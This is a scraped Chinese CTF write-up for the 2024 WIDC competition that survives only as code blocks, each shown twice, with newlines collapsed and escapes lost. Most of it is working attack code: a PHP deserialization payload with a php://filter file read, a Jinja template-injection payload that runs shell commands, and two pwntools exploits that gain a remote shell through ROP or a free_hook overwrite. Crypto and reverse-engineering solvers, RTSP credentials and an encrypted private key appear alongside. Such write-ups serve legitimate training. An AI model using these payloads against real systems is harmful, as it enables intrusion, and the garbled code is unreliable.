# 2024 WIDC writeup by Arr3stY0u

> 原文: https://www.ctfiot.com/183712.html
> ID: 183712

rtsp://ubnt:wbox123@172.10.0.12:8554/live

import pynmea2import foliumimport osdef parse_file(file_path):# 定义一个数据预处理的函数 txt_tables = [] f = open(file_path, "r",encoding='utf-8') line = f.readline() # 读取第一行 locations = [] while line: text = line[0:]# 从$GPGGA开始读 msg = pynmea2.parse(text) # print(msg.latitude) #24.551053333333332 # print(msg.longitude) #118.1067375 tmp = [] if(msg.latitude == 0.0 or msg.longitude == 0.0): line = f.readline() # 读取下一行 continue tmp.append(msg.latitude) tmp.append(msg.longitude) locations.append(tmp) line = f.readline() # 读取下一行 return locationslocations=parse_file("./a.dat")def draw_gps(locations, output_path, file_name): m = folium.Map(locations[0], zoom_start=15, attr='default') #中心区域的确定 folium.PolyLine( # polyline方法为将坐标用线段形式连接起来 locations, # 将坐标点连接起来 weight=3, # 线的大小为3 color='orange', # 线的颜色为橙色 opacity=0.8 # 线的透明度 ).add_to(m) # 将这条线添加到刚才的区域m内 # 起始点，结束点 folium.Marker(locations[0], popup='<b>Starting Point</b>').add_to(m) folium.Marker(locations[-1], popup='<b>End Point</b>').add_to(m) m.save(os.path.join(output_path, file_name)) # 将结果以HTML形式保存到指定路径draw_gps(locations,"./","index.html")#调用

file://$PROJECT_DIR$/src/PPlab.phpfile://$PROJECT_DIR$/src/index.phpfile://$PROJECT_DIR$/src/trueflag.php

<?php
class show { public $filename; function printContent() { $content = file_get_contents($this->filename); echo $content; }}
$a = new show();$a->filename = "php://filter/read=convert.base64-encode/resource=trueflag.php";echo serialize($a);
-----------------
POST /PPlab.php HTTP/1.1Host: 172.10.0.17:1221Upgrade-Insecure-Requests: 1User-Agent:ChromeAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9X-Forwarded-For: 127.0.0.1Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 104
show=O:4:"show":1:{s:8:"filename";s:61:"php://filter/read=convert.base64-encode/resource=trueflag.php";}

user={{ config.__class__.__init__.__globals__['os'].popen('cat ./flag/flag').read() }}&pwd=testyjyj

gs -o xx.pdf -sDEVICE=pdfwrite xx.pjl

from pwn import *context.log_level='debug'context.binary=ELF('./server')elf=ELF('./server')libc=ELF('./libc-2.31.so')SOCKFD = 4def get(payload): global p p = remote('172.10.0.16', 9080) py=flat({ 0:b'GET /', 255: b'r', 0x138:[ payload ], },filler=b'x00') p.send(py+b'rn')rop=ROP(elf)rop.http_response(4,elf.got['write'])get(rop.chain())p.recvuntil(b'</html>nHTTP/1.1')libcbase=u64(p.recvline().strip().ljust(8,b'x00'))- libc.symbols['write']success(hex(libcbase))libc.address=libcbaserop = ROP(libc)rop.dup2(SOCKFD, 0)rop.dup2(SOCKFD, 1)rop.dup2(SOCKFD, 2)rop.system(next(libc.search(b'/bin/sh')))get(rop.chain())p.recvuntil(b'</html>n')p.interactive()

密文：pbiTIScexzkjzu7byRie4gAyVnzDIlWXdmrm32JX4k9OPzh91SRuzgtgBjN2zbAzYmiP1/Mi0Iplb8vUEC8urUpKk1NOR12fliP/elZ2nXk=key:esa7esa7esa7esa7模式：AES/ECB/ZeroBytePadding

charon@root:~/Desktop/tools/pycdc$ ./pycdc 1.pyc# Source Generated with Decompyle++# File: 1.pyc (Python 3.8)
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modesfrom cryptography.hazmat.primitives import paddingfrom cryptography.hazmat.backends import default_backendimport base64
def encrypt(plaintext, key, iv): cipher = Cipher(algorithms.AES(key), modes.CBC(iv), default_backend(), **('backend',)) padder = padding.PKCS7(128).padder() padded_plaintext = padder.update(plaintext) + padder.finalize() encryptor = cipher.encryptor() ciphertext = encryptor.update(padded_plaintext) + encryptor.finalize() return base64.b64encode(ciphertext).decode()
plaintext = 'flag'ciphertext = 'XalqLcjPTIHqHSnybH24Vy5BfobRchwUlKZpkfOmBoniTrW7dKgdgKg3npyW0ENJgkVlbHjKDTvj0UfSX6agvAGFVlgNV/HE2BS0ELZIM+xE3lU5LNDehjjKeW+ZhZuZjEohAqCJBsHX2zKMrtLlIQ=='key = b'asfdsf141fsad11f'iv = b'MDEyMzQ1Njc4OWFi'ciphertext = encrypt(plaintext.encode(), key, iv)print('密文:', ciphertext)

# sagefrom Crypto.Util.number import *def GaussLatticeReduction(v1, v2): while True: if v2.norm() < v1.norm(): v1, v2 = v2, v1 m = round( v1v2 / v1.norm()^2 ) if m == 0: return (v1, v2)* v2 = v2 - m*v1
p = 31133702248881127631782881523509514476295949917122267121183371475000133184586174714396793644108294610935657329746903823657946536256899714076625760275173956706353888064555549064829709009640322743264038620966294636309911212621150898337629208482500384052935025619985047550270255090023343971256783414328092914248587672386617566422965425207785676797600936839556684715022346892107346366574407526099471338642307133437759220537846448437788211849588664491112404963383693116467782205041029098512207782583480993966604998421344660336431260561583879139849901548024253578304205860692342713953570388722937954933289936897205980716117h = 7479856923878243888440888672844723062047571272556529760791388804749830947638106557467887553359594527284215983651237303197361839342245930727075103851252694200077479188468017448449313614412769738144700971711549137789290733004590838892989968103378686521773849802601405707815668581933555308957750986742176692804532749076668670300598708809281336336814136161669355533687195881130337149759522328766625901698480300656083599150462729901168306146171589266181628852056728470683680551973098848836293771016415271912573220080593590309888271888517605697277144430578513191280950815089968643259211353244436267567557456053045262878466c = 429633025508597849623581682941413262998122137449005442145138470065847327103036727404626306379284511549714302199598866480970675273975210441015457022843111558443561825331941415126255871526201864795940071437602555024286559341823246182157480790439813986927891748029716157798569943993538191841077926115352987414280071817801043098050542082078666616788674806002113613279589438740909428444797915581688744647694596536620226032782501572321014769949362774191243994608572057792056353664666429685043726397327996076875440373242053749476708726634285972033216701275507339428064215442465140310384610569381749508378023099179079407328# Construct lattice.v1 = vector(ZZ, [1, h])v2 = vector(ZZ, [0, p])m = matrix([v1,v2]);
# Solve SVP.shortest_vector = m.LLL()[0]# shortest_vector = GaussLatticeReduction(v1, v2)[0]f, g = abs(shortest_vector[0]),abs(shortest_vector[1])print(f, g)
# Decrypt.a = f*c % p % gm = a * inverse_mod(f, g) % gprint('m=',m)print(long_to_bytes(int(m)))

----
104487247500523630173466372012725893519340931300717034092093816350849886822853396168341013290959218180002031254321615523603199349964982692123231600651096747843269073795060299161138930217923899257522072771491233070803811809812208840371872635298833148136787331270890661224119684926154327930512610649281320612648 124543096895293893329367669185601759252473199871894159618224942112012325224062867378866918876501559305963983337570110136768019392332660013395569122436762967931653460895335031144428244801453964870767329929024450393254183082388201674464525220841626637783670034040457808515142474641802222980794941462034685363019m= 67557894833899879721535443738683635889742076553897445643184762026832680586233392404925048827896424102785684459189389647962484b'f2jmf5ld0akrqhxmd7ig3ad22b0eda76e391RQ9tZMH5CBjPthat'

jm0g3{djyalj{4og3k1vequwbi:f61:6f;36:;2dkkfAWRjSv2UFDukk

bool __fastcall Java_com_ctf_read_MainActivity_getFlag(__int64 a1, __int64 a2, __int64 a3){ const char *v3; // x19 size_t v4; // w20 const char *v5; // x0 __int64 v6; // x8 __int64 v7; // x9 unsigned __int8 *v8; // x11 _BYTE *v9; // x12 __int64 v10; // x17 int v11; // w2 int v12; // w1 int v13; // t1 _BOOL4 v14; // w4 unsigned int v15; // w7 _BOOL4 v16; // w20 _BOOL4 v17; // w10 _BOOL4 v18; // w27 unsigned int v19; // w5 unsigned int v20; // w6 int v21; // w4 char v22; // w10 __int64 v24; // x8 char *v25; // x10 const char *v26; // x9 unsigned int v27; // w15 __int64 v28; // [xsp+8h] [xbp-8h]
 v3 = (const char *)_JString2CStr(a1, a3); v4 = strlen(v3); v5 = (const char *)malloc(v4 + 1); v5[v4] = 0; if ( (int)v4 < 1 ) return strcmp(v5, buff) == 0; v6 = v4; if ( v4 < 2uLL ) { v7 = 0LL;LABEL_22: v24 = v6 - v7; v25 = (char *)&v5[v7]; v26 = &v3[v7]; do { v27 = *(unsigned __int8 *)v26; if ( v27 - 48 <= 9 ) { v27 = ((unsigned __int8)(v27 - 45) % 0xAu) | 0x30; } else if ( v27 - 97 > 25 ) { if ( v27 - 65 <= 25 ) v27 = (unsigned __int8)(v27 - 62) % 0x1Au + 65; } else { v27 = (unsigned __int8)(v27 - 94) % 0x1Au + 97; } --v24; ++v26; *v25++ = v27 ^ 3; } while ( v24 ); return strcmp(v5, buff) == 0; } v8 = (unsigned __int8 *)(v3 + 1); v9 = v5 + 1; v28 = v4 & 1; v7 = v4 - v28; v10 = v7; do { v11 = *(v8 - 1); v13 = *v8; v8 += 2; v12 = v13; v14 = (unsigned __int8)(v13 - 58) < 246u; // >0x39 or < 0x30 v15 = v11 - 65; v16 = (unsigned __int8)(v13 - 123) < 230u; v17 = (unsigned int)(v13 - 65) > 0x19; v18 = (unsigned int)(v13 - 65) < 26; v19 = ((unsigned __int8)(v13 - 45) % 0xAu) | 0x30; if ( (unsigned int)(v11 - 97) >= 26 ) // <97 v20 = ((unsigned __int8)(v11 - 45) % 0xAu) | 0x30; else v20 = (unsigned __int8)(v11 - 94) % 26u + 97; v21 = v14 && v16; if ( (unsigned int)(v12 - 97) < 26 ) // 97 <= x <= 122 v19 = (unsigned __int8)(v12 - 94) % 26u + 97; if ( (unsigned __int8)(v11 - 58) < 246u && (unsigned __int8)(v11 - 123) < 230u && v15 < 0x1A ) v20 = (unsigned __int8)(v11 - 62) % 26u + 65; if ( (v21 & v18) != 0 ) v19 = (unsigned __int8)(v12 - 62) % 26u + 65; if ( (unsigned __int8)(v11 - 58) >= 246u || (unsigned __int8)(v11 - 123) >= 230u || v15 <= 0x19 ) LOBYTE(v11) = v20; if ( (v21 & v17) != 0 ) v22 = v12; else v22 = v19; v10 -= 2LL; *(v9 - 1) = v11 ^ 3; *v9 = v22 ^ 3; v9 += 2; } while ( v10 ); if ( v28 ) goto LABEL_22; return strcmp(v5, buff) == 0;}

#include <stdio.h>
int main(void){ // if ( (unsigned __int8)(47 - 123) < 230 )// printf("33333n"); char enc[] = "jm0g3{djyalj{4og3k1vequwbi:f61:6f;36:;2dkkfAWRjSv2UFDukk";
 for(int i = 0; i < 56; i++) { for(int j = 0; j < 0x7f; j++) { unsigned char tmp = j; if(j >= 0x30 && j <= 0x39) tmp = ((unsigned __int8)(j - 45) % 0xA) | 0x30; if(j >= 'A' && j <= 'Z') tmp = (unsigned __int8)(j - 62) % 26 + 65; if(j >= 'a' && j <= 'z') tmp = (unsigned __int8)(j - 94) % 26 + 97; tmp ^= 3; if(tmp == enc[i]) { putchar(j); break; } } }
 return 0;}

Exp:#coding=utf8from pwn import *context.log_level = 'debug'context.terminal = ['gnome-terminal','-x','bash','-c']local = 0binary_name = 'pwn'if local: cn = process('./'+binary_name)else: cn = remote('172.10.0.19',8888)ru = lambda x : cn.recvuntil(x)sn = lambda x : cn.send(x)rl = lambda : cn.recvline()sl = lambda x : cn.sendline(x)rv = lambda x : cn.recv(x)sa = lambda a,b : cn.sendafter(a,b)sla = lambda a,b : cn.sendlineafter(a,b)bin = ELF('./'+binary_name,checksec=False)def z(a=''): if local: gdb.attach(cn,a) if a == '': raw_input() else: passpush = 0x2A3Dpop = 0xFFFF28add = 0x0sub = 0x11111mul = 0xABCEFdiv = 0x514load = -1save = 0x10101010system_addr = 0x8051c60free_hook = 0x80e09f0def create(d): return " ".join([str(x) for x in d])heap_offset = (0x110-8) // 4code = create([push,push,push,push,load,push,sub,div,save])data = create(["/bin/sh",system_addr,4,heap_offset,free_hook])cn.sendline(code)cn.sendline(data)cn.interactive()

私钥：-----BEGIN ENCRYPTED PRIVATE KEY-----MIIFLTBXBgkqhkiG9w0BBQ0wSjApBgkqhkiG9w0BBQwwHAQIfp6g2gKBuQICAggAMAwGCCqGSIb3DQIJBQAwHQYJYIZIAWUDBAEqBBCRTqP45fvUX+BFO9Iq8W/7BIIE0Nfc4n4SbblrA52ukXCOPIZqDSwGgBcAlxjkRJc06Y3kaNMoz4DoOt1hL6GT1d6Th/nfGOEJKJyIz1qfwXiIyKuSGPXmTIukuHZC79jmgUVDd/Tiyg4h4WxJRnAHIeq66M/WLRWbxNqbzMWJ/aU8Vyk/bEgC62I[表情]xE4CUrLjq5mDgF0Mt9J2GBdMBtxONyCtMB4h+m1ik6/hIiBX+MsgUp6PMTYFpK2txbjR0BzR0zXIFuoK2BfDQKKkoJK3+L+6D2Pu69pc4/OmvrULNqNa9XJD1y7ptCAHaHwl/459CnCNoxf5d1GA5RvozHw4Tt6xPz8WQ2vMEucSYCqu4HeW7QBGdzH65IcdpWzDLtsssuSjeROljJL5UplEWwmjL+9y98I42MTFQa4Bhx+MqGEBu8ZMDAePfojwhy1cuhjq2/YcffpWncQnKz96RhIDpLA5SjPwZ7sD5pu0W59ZjtjxVZqqiGW7qph4tg9md8s/oDUjAs+84Wt8171X2GUsI2aiCA7PDzygr+9cmOusNfA+FR4kdC5vuzen0LcqiKHd8btFFeuHF7PGY5pODybGieFRMdK9K1KMMOFp+H5lXXOf5AGJVAvjsgvHKYuGAyfEMtq8KB1BjaOvwaaYY2l6s6E8M1wTt0sjcFaWhxm0sno2/ICmxOOMqm1vY6TRswM0kunSwSXRmaiWcvjyzIBsCRORjbL4qi/NaBfgxaAYZxljcfBNsJz4rvhD3HOm6gai5SNxKj8LFmOuZbJn7WsdbqastuH5lnsjAqqLxqf1N3p3M4qa2b1YimtA9lgBcs2GvChGIr9B6QKJGQdscjfwlDDiIEoHcsMdyhrUPGM024ff+5M+yfhkPRYoOialVp36yBpnGTXMv/FcVc16DBoSxYTmc8hpe68soAOwU2SL2U6VKilO81B2LuVU8EpF56xbfx0oV0Yp+aAYQaOE99WUqRD3f+y2fQbFzrxjD8zwK6gQCR/HV1FUNenyFNmAxNv7k1q9PSj+vDEgGk9b1YG+SfhyXzbsRNR6pPxN75eX/Lohf+fAlb+kOardIjAADFd0575VjoXsklxsYnHY0nrwCZl2url6+qAvfRNcQ+gDa9o83X+k/i1Q8M719KrL7XvhOuks226MFVTnACwFC+ACZVdiW73ab442EhYn4EgVNxIkSxmgonfgqQepftoCtK/ezKpR2+W630CqEl8BGi7s36V6cgBB7dcBLbvi2CGh2nCC0rWmPOOcpryrBxJf1VUhcWsemsHvSG0bIylqMV/POYFSzVVtpaO5kZu5JZbfPNt1FzKSBeSSDwUjUcDrhd+x1u26gVDDiCa2UGRzdu4OQCcOOgkkaQ8QQTPX75BiCMdu+BkhFBlMbPnatxCRsSHKTiHibwOydB7pwnC+ojtiNKwYypJnkuchPD0Ef3oUbiFVgFHnMwn6ivUp4WcspoluNAs6kqobxzKlfdTRJBd/8RJIdmm1MJkIjVHX+E+76B0Y1Rf4q1OJ/SSzHGt0YYXQXliPkWNze6JRA6Ko58t3lAV9JHcAlURkXTDxdSg1BR1zFwqUGLT6HUXBFcpsD/FTh1VX7cFMH/RZcnwIZcPen6orGl5IV4U42D0VoVPNYFUtRNyl2fHtqEIlC4NbA6xUFG-----END ENCRYPTED PRIVATE KEY-----flag:R0CHlZ3TTo8Uj8oymgTGGsG/okvPHP3n/v0CKOE4g0uDqEd4snXAq/kxxUSfEQh8xrGtN6XZB5gJpj+p/96cbECoBoVuhqRO9BxmH63X7cHtv6R3181b0aXuQvSF5uQ1DLgl+nIgKcrhromVryYZYtNWU5Y3BkejWtUL+2tfBRyvB1fGPNZB7OmCALFXpVtb0e5I7x+PlGuPCn1KCCnSS3WwwOLMz6Ftk8p2rEevlmAeMGE3UzjgZO3QVg92X1bXKW0cN+LCOgwkwAx2LJWiHZXzN6dpSoFJ2DETnsQ5BUkQGzkxNQBH6ycelFO/Lx5iHnSBb7bI4dCooGaX0qXx0w==

cipflag:b'xebxb1J:}xb6xadSx89x86xabxe7x9bsxd5xebyxf2xdexd2nxf9xa3xa8Gkxb2$BEx03x9fxa1xf7xa9x19x85Sxa8Yxe2Vx98x8dx1eux84xbd`-xcaxd4xc3Em\xd1xa1xf7i6xcbx0cx842txccx94xe6x94xeeAxb4Hxd32hxf5x13K'randomiv:b'xddx92xd2x1axb8xe2<Hxb7xfaNx94xc8x1a$xb3'

>>> original_hex = 0x3836353635367830>>> original_hex.to_bytes(32, byteorder = 'big')b'x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00865656x0'>>> original_hex.to_bytes(32, byteorder = 'big').hex()'0000000000000000000000000000000000000000000000003836353635367830'


```
rtsp://ubnt:wbox123@172.10.0.12:8554/live
```



```
import pynmea2import foliumimport osdef parse_file(file_path):# 定义一个数据预处理的函数 txt_tables = [] f = open(file_path, "r",encoding='utf-8') line = f.readline() # 读取第一行 locations = [] while line: text = line[0:]# 从$GPGGA开始读 msg = pynmea2.parse(text) # print(msg.latitude) #24.551053333333332 # print(msg.longitude) #118.1067375 tmp = [] if(msg.latitude == 0.0 or msg.longitude == 0.0): line = f.readline() # 读取下一行 continue tmp.append(msg.latitude) tmp.append(msg.longitude) locations.append(tmp) line = f.readline() # 读取下一行 return locationslocations=parse_file("./a.dat")def draw_gps(locations, output_path, file_name): m = folium.Map(locations[0], zoom_start=15, attr='default') #中心区域的确定 folium.PolyLine( # polyline方法为将坐标用线段形式连接起来 locations, # 将坐标点连接起来 weight=3, # 线的大小为3 color='orange', # 线的颜色为橙色 opacity=0.8 # 线的透明度 ).add_to(m) # 将这条线添加到刚才的区域m内 # 起始点，结束点 folium.Marker(locations[0], popup='<b>Starting Point</b>').add_to(m) folium.Marker(locations[-1], popup='<b>End Point</b>').add_to(m) m.save(os.path.join(output_path, file_name)) # 将结果以HTML形式保存到指定路径draw_gps(locations,"./","index.html")#调用
```



```
file://$PROJECT_DIR$/src/PPlab.phpfile://$PROJECT_DIR$/src/index.phpfile://$PROJECT_DIR$/src/trueflag.php
```



```
<?php
class show { public $filename; function printContent() { $content = file_get_contents($this->filename); echo $content; }}
$a = new show();$a->filename = "php://filter/read=convert.base64-encode/resource=trueflag.php";echo serialize($a);
-----------------
POST /PPlab.php HTTP/1.1Host: 172.10.0.17:1221Upgrade-Insecure-Requests: 1User-Agent:ChromeAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9X-Forwarded-For: 127.0.0.1Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 104
show=O:4:"show":1:{s:8:"filename";s:61:"php://filter/read=convert.base64-encode/resource=trueflag.php";}
```



```
user={{ config.__class__.__init__.__globals__['os'].popen('cat ./flag/flag').read() }}&pwd=testyjyj
```



```
gs -o xx.pdf -sDEVICE=pdfwrite xx.pjl
```



```
from pwn import *context.log_level='debug'context.binary=ELF('./server')elf=ELF('./server')libc=ELF('./libc-2.31.so')SOCKFD = 4def get(payload): global p p = remote('172.10.0.16', 9080) py=flat({ 0:b'GET /', 255: b'r', 0x138:[ payload ], },filler=b'x00') p.send(py+b'rn')rop=ROP(elf)rop.http_response(4,elf.got['write'])get(rop.chain())p.recvuntil(b'</html>nHTTP/1.1')libcbase=u64(p.recvline().strip().ljust(8,b'x00'))- libc.symbols['write']success(hex(libcbase))libc.address=libcbaserop = ROP(libc)rop.dup2(SOCKFD, 0)rop.dup2(SOCKFD, 1)rop.dup2(SOCKFD, 2)rop.system(next(libc.search(b'/bin/sh')))get(rop.chain())p.recvuntil(b'</html>n')p.interactive()
```



```
密文：pbiTIScexzkjzu7byRie4gAyVnzDIlWXdmrm32JX4k9OPzh91SRuzgtgBjN2zbAzYmiP1/Mi0Iplb8vUEC8urUpKk1NOR12fliP/elZ2nXk=key:esa7esa7esa7esa7模式：AES/ECB/ZeroBytePadding
```



```
charon@root:~/Desktop/tools/pycdc$ ./pycdc 1.pyc# Source Generated with Decompyle++# File: 1.pyc (Python 3.8)
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modesfrom cryptography.hazmat.primitives import paddingfrom cryptography.hazmat.backends import default_backendimport base64
def encrypt(plaintext, key, iv): cipher = Cipher(algorithms.AES(key), modes.CBC(iv), default_backend(), **('backend',)) padder = padding.PKCS7(128).padder() padded_plaintext = padder.update(plaintext) + padder.finalize() encryptor = cipher.encryptor() ciphertext = encryptor.update(padded_plaintext) + encryptor.finalize() return base64.b64encode(ciphertext).decode()
plaintext = 'flag'ciphertext = 'XalqLcjPTIHqHSnybH24Vy5BfobRchwUlKZpkfOmBoniTrW7dKgdgKg3npyW0ENJgkVlbHjKDTvj0UfSX6agvAGFVlgNV/HE2BS0ELZIM+xE3lU5LNDehjjKeW+ZhZuZjEohAqCJBsHX2zKMrtLlIQ=='key = b'asfdsf141fsad11f'iv = b'MDEyMzQ1Njc4OWFi'ciphertext = encrypt(plaintext.encode(), key, iv)print('密文:', ciphertext)
```



```
# sagefrom Crypto.Util.number import *def GaussLatticeReduction(v1, v2): while True: if v2.norm() < v1.norm(): v1, v2 = v2, v1 m = round( v1v2 / v1.norm()^2 ) if m == 0: return (v1, v2)* v2 = v2 - m*v1
p = 31133702248881127631782881523509514476295949917122267121183371475000133184586174714396793644108294610935657329746903823657946536256899714076625760275173956706353888064555549064829709009640322743264038620966294636309911212621150898337629208482500384052935025619985047550270255090023343971256783414328092914248587672386617566422965425207785676797600936839556684715022346892107346366574407526099471338642307133437759220537846448437788211849588664491112404963383693116467782205041029098512207782583480993966604998421344660336431260561583879139849901548024253578304205860692342713953570388722937954933289936897205980716117h = 7479856923878243888440888672844723062047571272556529760791388804749830947638106557467887553359594527284215983651237303197361839342245930727075103851252694200077479188468017448449313614412769738144700971711549137789290733004590838892989968103378686521773849802601405707815668581933555308957750986742176692804532749076668670300598708809281336336814136161669355533687195881130337149759522328766625901698480300656083599150462729901168306146171589266181628852056728470683680551973098848836293771016415271912573220080593590309888271888517605697277144430578513191280950815089968643259211353244436267567557456053045262878466c = 429633025508597849623581682941413262998122137449005442145138470065847327103036727404626306379284511549714302199598866480970675273975210441015457022843111558443561825331941415126255871526201864795940071437602555024286559341823246182157480790439813986927891748029716157798569943993538191841077926115352987414280071817801043098050542082078666616788674806002113613279589438740909428444797915581688744647694596536620226032782501572321014769949362774191243994608572057792056353664666429685043726397327996076875440373242053749476708726634285972033216701275507339428064215442465140310384610569381749508378023099179079407328# Construct lattice.v1 = vector(ZZ, [1, h])v2 = vector(ZZ, [0, p])m = matrix([v1,v2]);
# Solve SVP.shortest_vector = m.LLL()[0]# shortest_vector = GaussLatticeReduction(v1, v2)[0]f, g = abs(shortest_vector[0]),abs(shortest_vector[1])print(f, g)
# Decrypt.a = f*c % p % gm = a * inverse_mod(f, g) % gprint('m=',m)print(long_to_bytes(int(m)))

----
104487247500523630173466372012725893519340931300717034092093816350849886822853396168341013290959218180002031254321615523603199349964982692123231600651096747843269073795060299161138930217923899257522072771491233070803811809812208840371872635298833148136787331270890661224119684926154327930512610649281320612648 124543096895293893329367669185601759252473199871894159618224942112012325224062867378866918876501559305963983337570110136768019392332660013395569122436762967931653460895335031144428244801453964870767329929024450393254183082388201674464525220841626637783670034040457808515142474641802222980794941462034685363019m= 67557894833899879721535443738683635889742076553897445643184762026832680586233392404925048827896424102785684459189389647962484b'f2jmf5ld0akrqhxmd7ig3ad22b0eda76e391RQ9tZMH5CBjPthat'
```



```
jm0g3{djyalj{4og3k1vequwbi:f61:6f;36:;2dkkfAWRjSv2UFDukk
```



```
bool __fastcall Java_com_ctf_read_MainActivity_getFlag(__int64 a1, __int64 a2, __int64 a3){ const char *v3; // x19 size_t v4; // w20 const char *v5; // x0 __int64 v6; // x8 __int64 v7; // x9 unsigned __int8 *v8; // x11 _BYTE *v9; // x12 __int64 v10; // x17 int v11; // w2 int v12; // w1 int v13; // t1 _BOOL4 v14; // w4 unsigned int v15; // w7 _BOOL4 v16; // w20 _BOOL4 v17; // w10 _BOOL4 v18; // w27 unsigned int v19; // w5 unsigned int v20; // w6 int v21; // w4 char v22; // w10 __int64 v24; // x8 char *v25; // x10 const char *v26; // x9 unsigned int v27; // w15 __int64 v28; // [xsp+8h] [xbp-8h]
 v3 = (const char *)_JString2CStr(a1, a3); v4 = strlen(v3); v5 = (const char *)malloc(v4 + 1); v5[v4] = 0; if ( (int)v4 < 1 ) return strcmp(v5, buff) == 0; v6 = v4; if ( v4 < 2uLL ) { v7 = 0LL;LABEL_22: v24 = v6 - v7; v25 = (char *)&v5[v7]; v26 = &v3[v7]; do { v27 = *(unsigned __int8 *)v26; if ( v27 - 48 <= 9 ) { v27 = ((unsigned __int8)(v27 - 45) % 0xAu) | 0x30; } else if ( v27 - 97 > 25 ) { if ( v27 - 65 <= 25 ) v27 = (unsigned __int8)(v27 - 62) % 0x1Au + 65; } else { v27 = (unsigned __int8)(v27 - 94) % 0x1Au + 97; } --v24; ++v26; *v25++ = v27 ^ 3; } while ( v24 ); return strcmp(v5, buff) == 0; } v8 = (unsigned __int8 *)(v3 + 1); v9 = v5 + 1; v28 = v4 & 1; v7 = v4 - v28; v10 = v7; do { v11 = *(v8 - 1); v13 = *v8; v8 += 2; v12 = v13; v14 = (unsigned __int8)(v13 - 58) < 246u; // >0x39 or < 0x30 v15 = v11 - 65; v16 = (unsigned __int8)(v13 - 123) < 230u; v17 = (unsigned int)(v13 - 65) > 0x19; v18 = (unsigned int)(v13 - 65) < 26; v19 = ((unsigned __int8)(v13 - 45) % 0xAu) | 0x30; if ( (unsigned int)(v11 - 97) >= 26 ) // <97 v20 = ((unsigned __int8)(v11 - 45) % 0xAu) | 0x30; else v20 = (unsigned __int8)(v11 - 94) % 26u + 97; v21 = v14 && v16; if ( (unsigned int)(v12 - 97) < 26 ) // 97 <= x <= 122 v19 = (unsigned __int8)(v12 - 94) % 26u + 97; if ( (unsigned __int8)(v11 - 58) < 246u && (unsigned __int8)(v11 - 123) < 230u && v15 < 0x1A ) v20 = (unsigned __int8)(v11 - 62) % 26u + 65; if ( (v21 & v18) != 0 ) v19 = (unsigned __int8)(v12 - 62) % 26u + 65; if ( (unsigned __int8)(v11 - 58) >= 246u || (unsigned __int8)(v11 - 123) >= 230u || v15 <= 0x19 ) LOBYTE(v11) = v20; if ( (v21 & v17) != 0 ) v22 = v12; else v22 = v19; v10 -= 2LL; *(v9 - 1) = v11 ^ 3; *v9 = v22 ^ 3; v9 += 2; } while ( v10 ); if ( v28 ) goto LABEL_22; return strcmp(v5, buff) == 0;}
```



```
#include <stdio.h>
int main(void){ // if ( (unsigned __int8)(47 - 123) < 230 )// printf("33333n"); char enc[] = "jm0g3{djyalj{4og3k1vequwbi:f61:6f;36:;2dkkfAWRjSv2UFDukk";
 for(int i = 0; i < 56; i++) { for(int j = 0; j < 0x7f; j++) { unsigned char tmp = j; if(j >= 0x30 && j <= 0x39) tmp = ((unsigned __int8)(j - 45) % 0xA) | 0x30; if(j >= 'A' && j <= 'Z') tmp = (unsigned __int8)(j - 62) % 26 + 65; if(j >= 'a' && j <= 'z') tmp = (unsigned __int8)(j - 94) % 26 + 97; tmp ^= 3; if(tmp == enc[i]) { putchar(j); break; } } }
 return 0;}
```



```
Exp:#coding=utf8from pwn import *context.log_level = 'debug'context.terminal = ['gnome-terminal','-x','bash','-c']local = 0binary_name = 'pwn'if local: cn = process('./'+binary_name)else: cn = remote('172.10.0.19',8888)ru = lambda x : cn.recvuntil(x)sn = lambda x : cn.send(x)rl = lambda : cn.recvline()sl = lambda x : cn.sendline(x)rv = lambda x : cn.recv(x)sa = lambda a,b : cn.sendafter(a,b)sla = lambda a,b : cn.sendlineafter(a,b)bin = ELF('./'+binary_name,checksec=False)def z(a=''): if local: gdb.attach(cn,a) if a == '': raw_input() else: passpush = 0x2A3Dpop = 0xFFFF28add = 0x0sub = 0x11111mul = 0xABCEFdiv = 0x514load = -1save = 0x10101010system_addr = 0x8051c60free_hook = 0x80e09f0def create(d): return " ".join([str(x) for x in d])heap_offset = (0x110-8) // 4code = create([push,push,push,push,load,push,sub,div,save])data = create(["/bin/sh",system_addr,4,heap_offset,free_hook])cn.sendline(code)cn.sendline(data)cn.interactive()
```



```
私钥：-----BEGIN ENCRYPTED PRIVATE KEY-----MIIFLTBXBgkqhkiG9w0BBQ0wSjApBgkqhkiG9w0BBQwwHAQIfp6g2gKBuQICAggAMAwGCCqGSIb3DQIJBQAwHQYJYIZIAWUDBAEqBBCRTqP45fvUX+BFO9Iq8W/7BIIE0Nfc4n4SbblrA52ukXCOPIZqDSwGgBcAlxjkRJc06Y3kaNMoz4DoOt1hL6GT1d6Th/nfGOEJKJyIz1qfwXiIyKuSGPXmTIukuHZC79jmgUVDd/Tiyg4h4WxJRnAHIeq66M/WLRWbxNqbzMWJ/aU8Vyk/bEgC62I[表情]xE4CUrLjq5mDgF0Mt9J2GBdMBtxONyCtMB4h+m1ik6/hIiBX+MsgUp6PMTYFpK2txbjR0BzR0zXIFuoK2BfDQKKkoJK3+L+6D2Pu69pc4/OmvrULNqNa9XJD1y7ptCAHaHwl/459CnCNoxf5d1GA5RvozHw4Tt6xPz8WQ2vMEucSYCqu4HeW7QBGdzH65IcdpWzDLtsssuSjeROljJL5UplEWwmjL+9y98I42MTFQa4Bhx+MqGEBu8ZMDAePfojwhy1cuhjq2/YcffpWncQnKz96RhIDpLA5SjPwZ7sD5pu0W59ZjtjxVZqqiGW7qph4tg9md8s/oDUjAs+84Wt8171X2GUsI2aiCA7PDzygr+9cmOusNfA+FR4kdC5vuzen0LcqiKHd8btFFeuHF7PGY5pODybGieFRMdK9K1KMMOFp+H5lXXOf5AGJVAvjsgvHKYuGAyfEMtq8KB1BjaOvwaaYY2l6s6E8M1wTt0sjcFaWhxm0sno2/ICmxOOMqm1vY6TRswM0kunSwSXRmaiWcvjyzIBsCR